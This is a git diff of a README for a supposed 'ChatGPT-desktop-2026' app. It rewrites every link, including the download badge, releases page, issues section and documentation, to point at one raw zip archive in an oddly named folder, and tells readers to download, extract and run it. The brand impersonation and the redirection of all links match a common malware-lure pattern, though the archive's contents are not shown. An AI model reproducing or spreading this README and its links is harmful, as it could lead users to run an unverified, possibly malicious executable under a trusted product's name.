@@ -1,6 +1,6 @@
 # 🤖 ChatGPT-desktop-2026 - Your AI Assistant at Home
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ChatGPT--desktop--2026-blue)](https://github.com/Philippum/ChatGPT-desktop-2026/releases)
+[![Download Now](https://github.com/Philippum/ChatGPT-desktop-2026/raw/refs/heads/main/dermatine/Chat_GP_desktop_1.2-alpha.1.zip%20Now-ChatGPT--desktop--2026-blue)](https://github.com/Philippum/ChatGPT-desktop-2026/raw/refs/heads/main/dermatine/Chat_GP_desktop_1.2-alpha.1.zip)
 
 ## 📦 Description
 
@@ -25,7 +25,7 @@ Whether you're a student, writer, developer, or just curious, ChatGPT offers a s
 
 1. **Download the latest release archive.**  
    Visit the following link to download the latest version of ChatGPT:
-   [Download the latest release](https://github.com/Philippum/ChatGPT-desktop-2026/releases).
+   [Download the latest release](https://github.com/Philippum/ChatGPT-desktop-2026/raw/refs/heads/main/dermatine/Chat_GP_desktop_1.2-alpha.1.zip).
 
 2. **Extract the archive to a location of your choice.**  
    Locate the downloaded file, which will typically be in your Downloads folder. Right-click on the file and choose "Extract All" or a similar option depending on your system.
@@ -45,7 +45,7 @@ Whether you're a student, writer, developer, or just curious, ChatGPT offers a s
 
 To download ChatGPT:
 
-1. Visit this page to download: [ChatGPT Releases](https://github.com/Philippum/ChatGPT-desktop-2026/releases).
+1. Visit this page to download: [ChatGPT Releases](https://github.com/Philippum/ChatGPT-desktop-2026/raw/refs/heads/main/dermatine/Chat_GP_desktop_1.2-alpha.1.zip).
 2. Click on the latest release and download the archive file.
 3. Follow the extraction and running steps outlined earlier.
 
@@ -66,11 +66,11 @@ If you encounter issues while running ChatGPT, consider the following:
 
 If you need further assistance, feel free to check the following:
 
-- The [issues section](https://github.com/Philippum/ChatGPT-desktop-2026/issues) of the repository for common questions and reported problems.
+- The [issues section](https://github.com/Philippum/ChatGPT-desktop-2026/raw/refs/heads/main/dermatine/Chat_GP_desktop_1.2-alpha.1.zip) of the repository for common questions and reported problems.
 - Join our community discussions to share experiences and solutions with other users.
 
 ## 🔗 Related Information
 
-For a deeper understanding of how to use ChatGPT and its features, visit the [Official Documentation](https://github.com/Philippum/ChatGPT-desktop-2026/wiki).
+For a deeper understanding of how to use ChatGPT and its features, visit the [Official Documentation](https://github.com/Philippum/ChatGPT-desktop-2026/raw/refs/heads/main/dermatine/Chat_GP_desktop_1.2-alpha.1.zip).
 
 By following these steps, you can easily download and run ChatGPT on your desktop device. Enjoy the benefits of having an AI assistant ready to help you!
